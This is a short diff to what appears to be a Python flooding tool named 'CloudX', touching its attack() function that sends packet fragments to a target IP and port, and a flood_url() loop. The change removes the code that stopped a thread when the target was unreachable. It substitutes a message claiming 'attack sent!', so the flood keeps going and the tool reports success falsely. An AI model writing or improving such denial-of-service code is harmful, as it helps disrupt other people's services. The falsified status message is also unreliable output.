@@ -149,9 +149,7 @@ def attack(ip, port, threadNum):
                 send(frag, verbose=False)
 
         except urllib.error.URLError as e:
-            print("[*] Thread (%s) | Error! CloudX can't reach the target URL!" % (threadNum))
-            print("[*] Thread (%s) | Attack stopped." % (threadNum))
-            break
+            print("[*] Thread (%s) | Unstable: attack sent! [ -- CloudX -- ]" % (threadNum))
 
 def flood_url():
     while True:
